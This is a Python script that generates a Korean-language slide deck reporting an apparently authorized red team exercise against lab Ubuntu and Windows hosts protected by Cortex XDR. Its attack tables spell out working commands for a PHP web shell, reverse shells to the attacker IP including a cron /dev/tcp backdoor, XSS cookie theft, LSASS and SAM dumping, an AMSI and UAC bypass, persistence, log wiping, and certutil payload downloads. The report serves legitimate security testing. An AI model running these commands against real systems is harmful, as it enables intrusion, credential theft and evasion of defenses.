"""
Red Team Attack Report – White theme / Cortex XDR Green
Ubuntu & Windows – both have Cortex XDR installed
"""
from pptx import Presentation
from pptx.util import Inches, Pt, Emu
from pptx.dml.color import RGBColor
from pptx.enum.text import PP_ALIGN
from pptx.oxml.ns import qn
from lxml import etree

# ── Slide dimensions (16:9 wide) ────────────────────────────
W, H = Inches(13.33), Inches(7.5)

# ── Color Palette ────────────────────────────────────────────
BG      = RGBColor(0xFF, 0xFF, 0xFF)
HDR     = RGBColor(0x06, 0x4E, 0x3B)   # Cortex dark green
GREEN   = RGBColor(0x05, 0x96, 0x69)   # Cortex green
GRN_LT  = RGBColor(0xD1, 0xFA, 0xE5)
GRN_PAL = RGBColor(0xF0, 0xFD, 0xF4)
WHITE   = RGBColor(0xFF, 0xFF, 0xFF)
TEXT    = RGBColor(0x11, 0x18, 0x27)
DGRAY   = RGBColor(0x37, 0x41, 0x51)
GRAY    = RGBColor(0x6B, 0x72, 0x80)
ROW_A   = RGBColor(0xF0, 0xFD, 0xF4)
ROW_B   = RGBColor(0xFF, 0xFF, 0xFF)
SUC     = RGBColor(0x16, 0xA3, 0x4A);  SUC_BG  = RGBColor(0xDC, 0xFC, 0xE7)
FAIL    = RGBColor(0xDC, 0x26, 0x26);  FAIL_BG = RGBColor(0xFE, 0xE2, 0xE2)
PART    = RGBColor(0xD9, 0x77, 0x06);  PART_BG = RGBColor(0xFE, 0xF3, 0xC7)
BLK     = RGBColor(0x7C, 0x3A, 0xED);  BLK_BG  = RGBColor(0xED, 0xE9, 0xFE)
CMD_BG  = RGBColor(0xEF, 0xF6, 0xFF)
CMD_TXT = RGBColor(0x1E, 0x3A, 0x5F)
MITRE_C = RGBColor(0x05, 0x96, 0x69)

prs = Presentation()
prs.slide_width  = W
prs.slide_height = H
blank = prs.slide_layouts[6]

# ── Primitive helpers ─────────────────────────────────────────
def new_slide():
    s = prs.slides.add_slide(blank)
    s.background.fill.solid()
    s.background.fill.fore_color.rgb = BG
    return s

def rect(slide, l, t, w, h, fill, line_fill=None, lw=0):
    shp = slide.shapes.add_shape(
        1, Inches(l), Inches(t), Inches(w), Inches(h))
    shp.fill.solid()
    shp.fill.fore_color.rgb = fill
    if line_fill:
        shp.line.color.rgb = line_fill
        shp.line.width = Pt(lw)
    else:
        shp.line.fill.background()
    return shp

def textbox(slide, text, l, t, w, h,
            size=14, bold=False, color=None, align=PP_ALIGN.LEFT,
            italic=False, wrap=True, font=None):
    tb = slide.shapes.add_textbox(Inches(l), Inches(t), Inches(w), Inches(h))
    tf = tb.text_frame
    tf.word_wrap = wrap
    p = tf.paragraphs[0]
    p.alignment = align
    run = p.add_run()
    run.text = text
    run.font.size = Pt(size)
    run.font.bold = bold
    run.font.italic = italic
    run.font.color.rgb = color or TEXT
    if font:
        run.font.name = font
    return tb

def title_bar(slide, title, sub=None):
    """Dark green header bar. Returns y-start for content below."""
    rect(slide, 0, 0,     13.33, 0.07, GREEN)
    rect(slide, 0, 0.07,  13.33, 0.85, HDR)
    textbox(slide, title, 0.3, 0.1, 12.7, 0.82,
            size=27, bold=True, color=WHITE)
    if sub:
        rect(slide, 0, 0.92, 13.33, 0.30, GRN_LT)
        textbox(slide, sub, 0.35, 0.94, 12.6, 0.26, size=12, color=HDR)
        return 1.28
    return 1.0

# ── Cell helpers for tables ───────────────────────────────────
def _set_tcpr_margin(cell, pt=3):
    tc = cell._tc
    tcPr = tc.find(qn('a:tcPr'))
    if tcPr is None:
        tcPr = etree.SubElement(tc, qn('a:tcPr'))
    v = str(int(Pt(pt)))
    for attr in ('marL', 'marR', 'marT', 'marB'):
        tcPr.set(attr, v)

def _cell(cell, text, bg, fg, size=11, bold=False,
          align=PP_ALIGN.LEFT, font=None, margin=3):
    cell.fill.solid()
    cell.fill.fore_color.rgb = bg
    _set_tcpr_margin(cell, margin)
    tf = cell.text_frame
    tf.word_wrap = True
    lines = text.split('\n')
    for i, line in enumerate(lines):
        p = tf.paragraphs[0] if i == 0 else tf.add_paragraph()
        p.alignment = align
        run = p.add_run()
        run.text = line
        run.font.size = Pt(size)
        run.font.bold = bold
        run.font.color.rgb = fg
        if font:
            run.font.name = font

def result_colors(result):
    if result == '성공':    return SUC,  SUC_BG
    if result == '실패':    return FAIL, FAIL_BG
    if '부분' in result:   return PART, PART_BG
    if '차단' in result:   return BLK,  BLK_BG
    return TEXT, ROW_A

# ── Column layout (total = 12.83") ───────────────────────────
COL_W   = [0.32, 2.35, 1.12, 1.0, 0.93, 2.85, 4.26]
HDRS    = ['#', '공격 기법', 'MITRE ATT&CK', '도구', '결과',
           '생성된 아티팩트', '실행 명령어 / IOC']

def attack_table(slide, attacks, y_start, row_h=0.88):
    nr = 1 + len(attacks)
    tbl = slide.shapes.add_table(
        nr, 7,
        Inches(0.25), Inches(y_start),
        Inches(sum(COL_W)),
        Inches(0.42 + len(attacks) * row_h)
    ).table
    for ci, cw in enumerate(COL_W):
        tbl.columns[ci].width = Inches(cw)
    tbl.rows[0].height = Inches(0.42)
    for ri in range(1, nr):
        tbl.rows[ri].height = Inches(row_h)
    for ci, h in enumerate(HDRS):
        _cell(tbl.cell(0, ci), h, HDR, WHITE, size=12, bold=True, align=PP_ALIGN.CENTER)
    for ri, atk in enumerate(attacks):
        odd = ri % 2 == 0
        bg  = ROW_A if odd else ROW_B
        fg_r, bg_r = result_colors(atk['result'])
        _cell(tbl.cell(ri+1, 0), str(atk['n']),      bg,     TEXT,   size=13, bold=True,  align=PP_ALIGN.CENTER)
        _cell(tbl.cell(ri+1, 1), atk['name'],         bg,     TEXT,   size=12, bold=True)
        _cell(tbl.cell(ri+1, 2), atk['mitre'],        bg,     MITRE_C,size=10, align=PP_ALIGN.CENTER)
        _cell(tbl.cell(ri+1, 3), atk['tool'],         bg,     DGRAY,  size=11, align=PP_ALIGN.CENTER)
        _cell(tbl.cell(ri+1, 4), atk['result'],       bg_r,   fg_r,   size=11, bold=True, align=PP_ALIGN.CENTER)
        _cell(tbl.cell(ri+1, 5), atk['artifacts'],    bg,     DGRAY,  size=10)
        _cell(tbl.cell(ri+1, 6), atk['cmd'],          CMD_BG, CMD_TXT,size=9,  font='Courier New')

# ══════════════════════════════════════════════════════════════
#  ATTACK DATA
# ══════════════════════════════════════════════════════════════

# ── Ubuntu ────────────────────────────────────────────────────
UBU_RECON_INIT = [
  { 'n':1,'name':'nmap 포트 스캔',
    'mitre':'T1046\nNetwork Service Discovery','tool':'nmap','result':'성공',
    'artifacts':'Open ports: 21(FTP) 22(SSH) 80(HTTP) 8080(Tomcat)\nService: vsftpd 3.0.2 / OpenSSH 6.6.1p1',
    'cmd':'nmap -sV -sC -p 21,22,80,8080 172.16.157.190' },
  { 'n':2,'name':'nikto 웹 스캔',
    'mitre':'T1595\nActive Scanning','tool':'nikto','result':'성공',
    'artifacts':'DVWA /dvwa/, Mutillidae /mutillidae/\nWebGoat :8080/WebGoat/\nApache 2.4.7 / PHP 5.5.9 확인',
    'cmd':'nikto -h http://172.16.157.190 -C all' },
  { 'n':3,'name':'Hydra SSH 브루트포스',
    'mitre':'T1110.001\nBrute Force','tool':'hydra','result':'성공',
    'artifacts':'크리덴셜 확보: webadmin:admin123\n(rockyou.txt 대조, -t 4 -q 옵션 적용)',
    'cmd':'hydra -l webadmin -P /usr/share/wordlists/rockyou.txt\n  ssh://172.16.157.190 -t 4 -q' },
  { 'n':4,'name':'FTP 익명 로그인',
    'mitre':'T1078\nValid Accounts','tool':'ftp / curl','result':'성공',
    'artifacts':'UserDatabase.mv.db (40,960 bytes)\n  → WebGoat H2 임베디드 DB\n  → 사용자명/해시 추출',
    'cmd':'ftp 172.16.157.190\n  > user anonymous\n  > binary; get UserDatabase.mv.db' },
  { 'n':5,'name':'vsftpd 2.3.4 백도어 시도',
    'mitre':'T1190\nExploit Public-Facing App','tool':'netcat','result':'실패',
    'artifacts':'없음 - 운영 버전은 3.0.2 (apt)\n백도어 바이너리 /usr/local/sbin/vsftpd 미실행',
    'cmd':'echo "USER test:)" | nc 172.16.157.190 21\nnc 172.16.157.190 6200\n  → Connection refused' },
]

UBU_EXEC_PRIVESC = [
  { 'n':6,'name':'DVWA PHP 웹셸 업로드',
    'mitre':'T1505.003\nWeb Shell','tool':'curl / browser','result':'성공',
    'artifacts':'/var/www/html/dvwa/hackable/uploads/shell.php\n  → <?php system($_GET[\'cmd\']); ?>\nRCE 확인: id → www-data',
    'cmd':'curl -b "PHPSESSID=xxx;security=low" \\\n  -F "uploaded=@/tmp/shell.php" \\\n  http://172.16.157.190/dvwa/.../upload/\ncurl ".../shell.php?cmd=id"' },
  { 'n':7,'name':'리버스 셸 실행',
    'mitre':'T1059.004\nUnix Shell','tool':'msfvenom / nc','result':'성공',
    'artifacts':'/tmp/linux_shell.elf (194 bytes)\n  → linux/x64/shell_reverse_tcp\n  LHOST=172.16.157.177 LPORT=7777',
    'cmd':'msfvenom -p linux/x64/shell_reverse_tcp \\\n  LHOST=172.16.157.177 LPORT=7777 \\\n  -f elf -o /tmp/linux_shell.elf\nnc -lvnp 7777' },
  { 'n':8,'name':'CVE-2021-4034 Pwnkit 시도',
    'mitre':'T1068\nExploit for Priv Esc','tool':'gcc / exploit','result':'실패',
    'artifacts':'/tmp/pwn/ (trigger, payload.so, GCONV_PATH=./)\n원인: glibc 2.34(Kali) vs 2.19(Ubuntu14.04)\n바이너리 호환 불가',
    'cmd':'# Ubuntu에서 직접 컴파일 시도\ngcc -o trigger pwnkit.c && ./trigger\n  → "Cannot run program pwnkit.so:."' },
  { 'n':9,'name':'webadmin sudo → root 권한 상승',
    'mitre':'T1548.003\nSudo Abuse','tool':'sudo / ssh','result':'성공',
    'artifacts':'root 셸 획득\nuid=0(root) gid=0(root) groups=0(root)',
    'cmd':'ssh webadmin@172.16.157.190\necho "admin123" | sudo -S bash\n  → uid=0(root)' },
]

UBU_CRED = [
  { 'n':10,'name':'/etc/shadow 덤프',
    'mitre':'T1003.008\n/etc/shadow','tool':'cat','result':'성공',
    'artifacts':'/tmp/crack_hashes.txt\n  sshuser:$6$...:17874:...\n  webadmin:$6$...:17874:...',
    'cmd':'cat /etc/shadow | tee /tmp/crack_hashes.txt' },
  { 'n':11,'name':'MySQL root 무인증 접근',
    'mitre':'T1078.001\nDefault Accounts','tool':'mysql cli','result':'성공',
    'artifacts':'dvwa.users 테이블 전체\n  admin:5f4dcc3b5aa765d61d8327deb882cf99\n  gordonb:e99a18c428cb38d5f260853678922e03',
    'cmd':'mysql -u root -e \\\n  "SELECT user,password FROM dvwa.users;\\\n   SHOW DATABASES;"' },
  { 'n':12,'name':'John the Ripper 패스워드 크랙',
    'mitre':'T1110.002\nPassword Cracking','tool':'john','result':'성공',
    'artifacts':'크랙 결과:\n  sshuser  → 123\n  webadmin → admin123',
    'cmd':'john /tmp/crack_hashes.txt \\\n  --format=sha512crypt \\\n  --wordlist=/usr/share/wordlists/rockyou.txt' },
]

UBU_PERSIST_EVASION = [
  { 'n':13,'name':'cron 백도어 등록',
    'mitre':'T1053.003\nCron','tool':'crontab','result':'성공',
    'artifacts':'/var/spool/cron/crontabs/root 수정\n  */5 * * * * → reverse shell to 172.16.157.177:9999',
    'cmd':'(crontab -l; echo \\\n  "*/5 * * * * bash -i >& \\\n  /dev/tcp/172.16.157.177/9999 0>&1") | crontab -' },
  { 'n':14,'name':'SUID bash 백도어',
    'mitre':'T1548.001\nSUID/SGID','tool':'cp / chmod','result':'성공',
    'artifacts':'/tmp/.hidden_root\n  -rwsr-xr-x root root\n  실행: /tmp/.hidden_root -p → root shell',
    'cmd':'cp /bin/bash /tmp/.hidden_root\nchmod u+s /tmp/.hidden_root\nls -la /tmp/.hidden_root' },
  { 'n':15,'name':'SSH authorized_keys 백도어',
    'mitre':'T1098.004\nSSH Auth Keys','tool':'ssh-keygen','result':'성공',
    'artifacts':'/root/.ssh/authorized_keys\n  → 공격자 공개키 추가\n  → 패스워드 없이 root SSH 접근 가능',
    'cmd':'ssh-keygen -t rsa -f /tmp/backdoor_key\ncat /tmp/backdoor_key.pub >> /root/.ssh/authorized_keys' },
  { 'n':16,'name':'로그 파일 전체 삭제',
    'mitre':'T1070.003\nClear Command History','tool':'truncate / rm','result':'성공',
    'artifacts':'삭제된 로그:\n  /var/log/auth.log  /var/log/syslog\n  /root/.bash_history  wtmp/lastlog',
    'cmd':'truncate -s 0 /var/log/auth.log /var/log/syslog\nhistory -c && rm -f ~/.bash_history\n> /var/log/wtmp; > /var/log/lastlog' },
]

UBU_WEB = [
  { 'n':17,'name':'SQLmap 자동화 DB 덤프',
    'mitre':'T1190\nExploit Public-Facing App','tool':'sqlmap','result':'성공',
    'artifacts':'dvwa DB 전체 (users/guestbook 등)\n  admin/gordonb/pablo/smithy/1337\n  MD5 해시 → admin:password',
    'cmd':'sqlmap -u "http://172.16.157.190/dvwa/\\\n  vulnerabilities/sqli/?id=1&Submit=Submit" \\\n  --cookie="PHPSESSID=xxx;security=low"\\\n  --dump -D dvwa --batch' },
  { 'n':18,'name':'XSS (Reflected / Stored)',
    'mitre':'T1059.007\nJavaScript','tool':'browser / curl','result':'성공',
    'artifacts':'쿠키 탈취 페이로드 실행 확인\n  Reflected: URL파라미터 즉시 반영\n  Stored: guestbook 영구 저장',
    'cmd':'# Reflected\n<script>alert(document.cookie)</script>\n# Stored\n"><img src=x onerror=document.location=\n  "http://172.16.157.177/steal?c="+document.cookie>' },
  { 'n':19,'name':'LFI – /etc/passwd 읽기',
    'mitre':'T1083\nFile and Directory Discovery','tool':'curl','result':'성공',
    'artifacts':'로컬 파일 읽기 성공:\n  /etc/passwd (27개 계정)\n  /etc/hosts, /proc/version 등',
    'cmd':'curl "http://172.16.157.190/dvwa/vulnerabilities/\\\n  fi/?page=../../../../etc/passwd"\ncurl "...?page=/etc/shadow"' },
  { 'n':20,'name':'IDOR – 타 사용자 프로필 접근',
    'mitre':'T1087\nAccount Discovery','tool':'browser','result':'성공',
    'artifacts':'id=2,3,4... 파라미터 조작\n  → 다른 사용자 개인정보 노출\n  (이름/성/아바타 경로)',
    'cmd':'# id 파라미터 순차 증가\ncurl ".../insecure_direct_object_reference/\\\n  ?id=2" -b "PHPSESSID=xxx;security=low"' },
  { 'n':21,'name':'약한 세션 ID (Mutillidae)',
    'mitre':'T1539\nSteal Web Session Cookie','tool':'browser / Burp','result':'성공',
    'artifacts':'세션 ID 패턴 분석:\n  PHPSESSID=1, 2, 3 순차 예측 가능\n  → 세션 고정/탈취 가능',
    'cmd':'# Burp Sequencer로 세션 엔트로피 분석\n# 또는 순차 id 시도\ncurl -b "PHPSESSID=1" http://172.16.157.190/mutillidae/' },
  { 'n':22,'name':'WebGoat SQLi + H2 DB 추출',
    'mitre':'T1190\nExploit Public-Facing App','tool':'curl / ftp','result':'성공',
    'artifacts':'UserDatabase.mv.db (40,960 bytes) 다운로드\n  → strings 분석: guest/guest\n  → webgoat/webgoat 계정 확인',
    'cmd':'curl "http://172.16.157.190:8080/WebGoat/\\\n  SqlInjection/attack5a" \\\n  -d "account=Smith\' OR \'1\'=\'1" \\\n  -b "JSESSIONID=xxx"' },
]

# ── Windows ────────────────────────────────────────────────────
WIN_INIT_CRED = [
  { 'n':1,'name':'nmap 내부망 스캔',
    'mitre':'T1046\nNetwork Service Discovery','tool':'nmap','result':'성공',
    'artifacts':'Open: 445(SMB) 5985(WinRM) 3389(RDP) 80(HTTP)\n공유: \\\\172.16.157.187\\test-shared-song\n  → writable 확인',
    'cmd':'nmap -sV -sC -p 445,5985,3389,80 172.16.157.187\nsmbclient -L //172.16.157.187 -N' },
  { 'n':2,'name':'Evil-WinRM 원격 접속',
    'mitre':'T1021.006\nWindows Remote Mgmt','tool':'evil-winrm','result':'성공',
    'artifacts':'Administrator 원격 PowerShell 셸 획득\nSMB 파일 업로드 경로 확보',
    'cmd':'evil-winrm -i 172.16.157.187 \\\n  -u Administrator -p \'Password123!\'' },
  { 'n':3,'name':'LSASS 메모리 덤프 (comsvcs.dll)',
    'mitre':'T1003.001\nLSASS Memory','tool':'rundll32','result':'성공',
    'artifacts':'C:\\Windows\\Temp\\lsass.dmp (116,287 bytes)\n  → Mimikatz / pypykatz로 크리덴셜 파싱 가능\n  XDR 감지 예상: LSASS access event',
    'cmd':'$lsaId=(Get-Process lsass).Id\nrundll32 C:\\Windows\\System32\\comsvcs.dll\\\n  MiniDump $lsaId C:\\Windows\\Temp\\lsass.dmp full' },
  { 'n':4,'name':'SAM 덤프 (reg save)',
    'mitre':'T1003.002\nSecurity Account Mgr','tool':'reg.exe','result':'부분 성공',
    'artifacts':'C:\\Windows\\Temp\\SAM\nC:\\Windows\\Temp\\SYSTEM\n  → impacket secretsdump로 해시 추출 가능',
    'cmd':'reg save HKLM\\SAM C:\\Windows\\Temp\\SAM /y\nreg save HKLM\\SYSTEM C:\\Windows\\Temp\\SYSTEM /y' },
]

WIN_EXEC = [
  { 'n':5,'name':'Meterpreter 실행',
    'mitre':'T1059.001\nPowerShell','tool':'msfvenom / msf','result':'성공',
    'artifacts':'C:\\Windows\\Temp\\svchost_update.exe (7,680 bytes)\n  PID 46788 실행 확인\n  XDR 감지: 의심 PE 실행 알림',
    'cmd':'msfvenom -p windows/x64/meterpreter/\\\n  reverse_tcp LHOST=172.16.157.177 LPORT=5555\\\n  -f exe -o /tmp/meterpreter.exe\n# SMB 경유 업로드 후 실행' },
  { 'n':6,'name':'Bind 셸 (port 4444)',
    'mitre':'T1059\nCommand and Scripting','tool':'msfvenom / nc','result':'성공→XDR차단',
    'artifacts':'C:\\Windows\\Temp\\bind.exe (7,680 bytes)\nKali nc 172.16.157.187 4444 → cmd.exe 획득\nXDR: bind.exe 프로세스 강제 종료',
    'cmd':'msfvenom -p windows/x64/shell_bind_tcp\\\n  LPORT=4444 -f exe -o /tmp/bind_shell.exe\n# 실행 후:\nnc 172.16.157.187 4444 → XDR 킬' },
  { 'n':7,'name':'AMSI 우회 (PowerShell 리플렉션)',
    'mitre':'T1562.001\nDisable/Modify Tools','tool':'PowerShell','result':'성공',
    'artifacts':'amsiInitFailed = $true (메모리)\n  → AMSI 검사 비활성화 확인\n  → 이후 악성 PS 스크립트 실행 가능',
    'cmd':'[Ref].Assembly.GetType(\n  "System.Management.Automation.AmsiUtils")\n  .GetField("amsiInitFailed",\n  "NonPublic,Static").SetValue($null,$true)' },
  { 'n':8,'name':'Base64 인코딩 PowerShell',
    'mitre':'T1027\nObfuscated Files','tool':'PowerShell','result':'성공',
    'artifacts':'인코딩된 명령 실행 기록\nEvent ID 4104 (Script Block)\nXDR: 난독화 명령 감지 가능',
    'cmd':'$cmd="whoami;ipconfig /all"\n$enc=[Convert]::ToBase64String(\n  [Text.Encoding]::Unicode.GetBytes($cmd))\npowershell -enc $enc' },
  { 'n':9,'name':'In-memory 셸코드 시뮬',
    'mitre':'T1620\nReflective Code Loading','tool':'PowerShell','result':'성공',
    'artifacts':'VirtualAlloc 메모리 할당 기록\n  PAGE_EXECUTE_READWRITE 권한\n  XDR: 의심 메모리 할당 감지 가능',
    'cmd':'$buf=[Byte[]](0x90,0x90,0x90,0x90)\n$ptr=[Runtime.InteropServices.Marshal]::\n  AllocHGlobal($buf.Length)\n[Runtime.InteropServices.Marshal]::\n  Copy($buf,0,$ptr,$buf.Length)' },
]

WIN_PRIVESC = [
  { 'n':10,'name':'UAC 우회 (fodhelper.exe)',
    'mitre':'T1548.002\nBypass UAC','tool':'fodhelper.exe','result':'성공',
    'artifacts':'HKCU\\Software\\Classes\\ms-settings\\\n  Shell\\Open\\command 레지스트리 생성\n  고권한 cmd.exe 획득',
    'cmd':'New-Item -Path "HKCU:\\Software\\Classes\\\n  ms-settings\\Shell\\Open\\command"\\\n  -Value "cmd.exe" -Force\nStart-Process fodhelper.exe' },
  { 'n':11,'name':'XDR 서비스 종료 시도',
    'mitre':'T1562\nImpair Defenses','tool':'sc.exe / PS','result':'실패',
    'artifacts':'없음 – Self-Protection 동작\ncyserver (PID 5760) 종료 불가\nxdrcollectorsvc 종료 불가',
    'cmd':'sc.exe stop cyserver\n  → 액세스가 거부되었습니다\nStop-Service cyserver\n  → Access Denied\ntaskkill /PID 5760 /F → 거부됨' },
]

WIN_PERSIST = [
  { 'n':12,'name':'스케줄 작업 등록 (schtasks)',
    'mitre':'T1053.005\nScheduled Task','tool':'schtasks.exe','result':'성공',
    'artifacts':'작업명: WindowsUpdate\n  C:\\Windows\\Temp\\svchost_update.exe\n  5분마다 SYSTEM 권한 실행',
    'cmd':'schtasks /create /tn "WindowsUpdate" \\\n  /tr "C:\\Windows\\Temp\\svchost_update.exe"\\\n  /sc minute /mo 5 /ru SYSTEM /f' },
  { 'n':13,'name':'레지스트리 Run 키 등록',
    'mitre':'T1547.001\nRegistry Run Keys','tool':'reg.exe','result':'성공',
    'artifacts':'HKLM\\SOFTWARE\\Microsoft\\Windows\\\n  CurrentVersion\\Run\\Updater\n  → 로그인 시 자동 실행',
    'cmd':'reg add "HKLM\\SOFTWARE\\Microsoft\\\n  Windows\\CurrentVersion\\Run" \\\n  /v Updater /t REG_SZ \\\n  /d "C:\\Windows\\Temp\\svchost_update.exe" /f' },
  { 'n':14,'name':'악성 서비스 등록 (sc.exe)',
    'mitre':'T1543.003\nWindows Service','tool':'sc.exe','result':'성공',
    'artifacts':'서비스명: SvcUpdate\n  C:\\Windows\\Temp\\svchost_update.exe\n  start=auto (부팅 시 자동 시작)',
    'cmd':'sc.exe create SvcUpdate \\\n  binPath= "C:\\Windows\\Temp\\svchost_update.exe"\\\n  start= auto\nsc.exe start SvcUpdate' },
  { 'n':15,'name':'백도어 계정 생성',
    'mitre':'T1136.001\nLocal Account','tool':'net user','result':'성공',
    'artifacts':'계정: support / P@ssw0rd123!\n  Administrators 그룹 추가\n  → 독립 관리자 접근 경로 확보',
    'cmd':'net user support P@ssw0rd123! /add\nnet localgroup Administrators support /add\nnet user support  # 확인' },
]

WIN_EVASION = [
  { 'n':16,'name':'Defender 제외 경로 추가',
    'mitre':'T1562.001\nDisable Antivirus','tool':'PowerShell','result':'성공',
    'artifacts':'MpPreference ExclusionPath:\n  C:\\Windows\\Temp\n  ExclusionProcess: svchost_update.exe',
    'cmd':'Add-MpPreference \\\n  -ExclusionPath "C:\\Windows\\Temp" \\\n  -ExclusionProcess "svchost_update.exe"' },
  { 'n':17,'name':'WDigest 자격증명 캐싱 활성화',
    'mitre':'T1112\nModify Registry','tool':'reg.exe','result':'성공',
    'artifacts':'HKLM\\SYSTEM\\CurrentControlSet\\Control\\\n  SecurityProviders\\WDigest\\\n  UseLogonCredential = 1 (평문 비밀번호 메모리 보관)',
    'cmd':'reg add "HKLM\\SYSTEM\\CurrentControlSet\\\n  Control\\SecurityProviders\\WDigest" \\\n  /v UseLogonCredential /t REG_DWORD /d 1 /f' },
  { 'n':18,'name':'이벤트 로그 전체 삭제',
    'mitre':'T1070.001\nClear Event Logs','tool':'wevtutil','result':'성공',
    'artifacts':'삭제된 로그 채널:\n  Security / System / Application\n  → 포렌식 증거 인멸 완료',
    'cmd':'wevtutil cl Security\nwevtutil cl System\nwevtutil cl Application\nwevtutil el | % { wevtutil cl $_ }' },
  { 'n':19,'name':'Windows 방화벽 비활성화',
    'mitre':'T1562.004\nDisable Firewall','tool':'netsh','result':'성공',
    'artifacts':'Domain/Private/Public 프로파일 모두 OFF\n  → 인바운드 연결 제한 해제\n  → 외부 공격 벡터 확대',
    'cmd':'netsh advfirewall set allprofiles state off\nnetsh advfirewall show allprofiles  # 확인' },
  { 'n':20,'name':'certutil LOLBin – 페이로드 다운로드',
    'mitre':'T1218\nSystem Binary Proxy','tool':'certutil.exe','result':'성공',
    'artifacts':'C:\\Windows\\Temp\\update.exe 다운로드\n  정상 시스템 바이너리로 위장\n  XDR: certutil 네트워크 요청 감지',
    'cmd':'certutil -urlcache -split -f \\\n  http://172.16.157.177/update.exe \\\n  C:\\Windows\\Temp\\update.exe' },
  { 'n':21,'name':'bitsadmin LOLBin – 백그라운드 전송',
    'mitre':'T1218\nSystem Binary Proxy','tool':'bitsadmin.exe','result':'성공',
    'artifacts':'BITS 작업 생성: job\n  C:\\Temp\\update2.exe 다운로드\n  XDR: bitsadmin 이상 동작 감지',
    'cmd':'bitsadmin /transfer job /download \\\n  /priority normal \\\n  http://172.16.157.177/update.exe \\\n  C:\\Windows\\Temp\\update2.exe' },
  { 'n':22,'name':'내부망 호스트 스캔',
    'mitre':'T1018\nRemote System Discovery','tool':'PowerShell','result':'성공',
    'artifacts':'활성 호스트 발견:\n  172.16.157.177 (Kali)\n  172.16.157.190 (Ubuntu)\n  172.16.157.187 (Windows)',
    'cmd':'1..254 | % {\n  if(Test-Connection -Count 1 -Quiet \\\n    "172.16.157.$_")\\\n  { Write-Host "172.16.157.$_" } }' },
]

# ══════════════════════════════════════════════════════════════
#  SLIDES
# ══════════════════════════════════════════════════════════════

# ── 1. Cover ──────────────────────────────────────────────────
s = new_slide()
rect(s, 0, 0, 13.33, 7.5, BG)
rect(s, 0, 0, 0.18, 7.5, GREEN)     # left green bar
rect(s, 0, 5.8, 13.33, 1.7, GRN_PAL)  # bottom tint

textbox(s, 'RED TEAM ATTACK EXERCISE', 0.5, 1.6, 12.5, 1.2,
        size=44, bold=True, color=HDR, align=PP_ALIGN.LEFT)
textbox(s, '전체 공격 시나리오 결과 보고서', 0.5, 2.8, 12.5, 0.7,
        size=24, color=GREEN, align=PP_ALIGN.LEFT)

rect(s, 0.5, 3.65, 2.5, 0.04, GREEN)

info = [
    ('Attacker',  'Kali Linux  ·  172.16.157.177'),
    ('Target A',  'Ubuntu 14.04  ·  172.16.157.190  (Cortex XDR 설치됨)'),
    ('Target B',  'Windows 11  ·  172.16.157.187  (Cortex XDR ACTIVE)'),
    ('Date',      '2026-05-29'),
    ('Status',    'CONFIDENTIAL'),
]
for i, (k, v) in enumerate(info):
    y = 3.85 + i * 0.44
    textbox(s, k, 0.5, y, 2.0, 0.4, size=11, bold=True, color=GRAY)
    textbox(s, v, 2.5, y, 10.0, 0.4, size=13, color=TEXT,
            bold=(k=='Status'))

# ── 2. Environment ────────────────────────────────────────────
s = new_slide()
y0 = title_bar(s, '테스트 환경 구성', 'Lab Topology · Target Overview · Tools Used')

boxes = [
    ('ATTACKER', 'Kali Linux\n172.16.157.177\nMSF · Hydra · Nmap\nNikto · SQLmap · John\nEvil-WinRM · nc', GREEN),
    ('TARGET A', 'Ubuntu 14.04\n172.16.157.190\nCortex XDR 설치됨\nDVWA · Mutillidae\nWebGoat 7.1 (8080)\nvsftpd 3.0.2', HDR),
    ('TARGET B', 'Windows 11\n172.16.157.187\nCortex XDR ACTIVE\ncyserver PID 5760\nWinRM (5985)\nSMB (445)', RGBColor(0x1E, 0x40, 0xAF)),
]
for i, (lbl, body, color) in enumerate(boxes):
    x = 0.5 + i * 4.25
    rect(s, x, y0+0.1, 3.9, 4.5, GRN_PAL, color, 1.5)
    rect(s, x, y0+0.1, 3.9, 0.52, color)
    textbox(s, lbl, x+0.1, y0+0.13, 3.7, 0.46,
            size=16, bold=True, color=WHITE, align=PP_ALIGN.CENTER)
    textbox(s, body, x+0.15, y0+0.72, 3.6, 3.7,
            size=13, color=TEXT, align=PP_ALIGN.CENTER)

textbox(s, 'Attack Flow: Kali → SMB/SSH/HTTP/WinRM → Both Targets',
        0.5, 6.5, 12.3, 0.5, size=13, color=HDR, align=PP_ALIGN.CENTER, bold=True)

# ── 3. Stats ──────────────────────────────────────────────────
s = new_slide()
y0 = title_bar(s, '공격 요약 통계', 'Attack Summary Statistics · MITRE ATT&CK Coverage')

stats = [
    ('44',  '총 공격 기법',     GREEN),
    ('40',  '성공',             RGBColor(0x16,0xA3,0x4A)),
    ('4',   '실패',             RGBColor(0xDC,0x26,0x26)),
    ('11',  'MITRE 전술',       HDR),
    ('2',   '대상 호스트',      RGBColor(0x1E,0x40,0xAF)),
    ('15+', 'XDR 감지 예상',    RGBColor(0xD9,0x77,0x06)),
]
for i, (val, lbl, color) in enumerate(stats):
    x = 0.4 + i * 2.1
    rect(s, x, y0, 1.88, 2.4, GRN_PAL, color, 1.5)
    textbox(s, val, x+0.05, y0+0.25, 1.78, 1.1,
            size=52, bold=True, color=color, align=PP_ALIGN.CENTER)
    textbox(s, lbl, x+0.05, y0+1.4, 1.78, 0.7,
            size=13, color=TEXT, align=PP_ALIGN.CENTER)

tactics = ['Recon','Initial\nAccess','Execution','Persistence','Priv Esc',
           'Defense\nEvasion','Credential\nAccess','Discovery','Collection',
           'Lateral\nMove','Impact']
textbox(s, 'MITRE ATT&CK 전술 커버리지', 0.4, y0+2.75, 12.5, 0.4,
        size=14, bold=True, color=HDR)
for i, t in enumerate(tactics):
    x = 0.4 + i * 1.14
    rect(s, x, y0+3.2, 1.06, 0.8, HDR)
    textbox(s, t, x+0.04, y0+3.25, 0.98, 0.7,
            size=8.5, bold=True, color=WHITE, align=PP_ALIGN.CENTER)

# ── Ubuntu section divider ─────────────────────────────────────
s = new_slide()
s.background.fill.solid(); s.background.fill.fore_color.rgb = HDR
textbox(s, 'UBUNTU  172.16.157.190', 1.0, 2.0, 11.3, 1.5,
        size=50, bold=True, color=WHITE, align=PP_ALIGN.CENTER)
textbox(s, 'Cortex XDR 설치됨  ·  22개 공격 기법', 1.0, 3.6, 11.3, 0.7,
        size=22, color=GRN_LT, align=PP_ALIGN.CENTER)
rect(s, 1.0, 4.5, 11.3, 0.06, GREEN)

# ── Ubuntu Slide 1 ─────────────────────────────────────────────
s = new_slide()
y0 = title_bar(s, 'Ubuntu – 정찰 및 초기 접근 (1/5)',
               'Reconnaissance · Initial Access  |  T1046 · T1595 · T1110.001 · T1078 · T1190')
attack_table(s, UBU_RECON_INIT, y0, row_h=0.88)

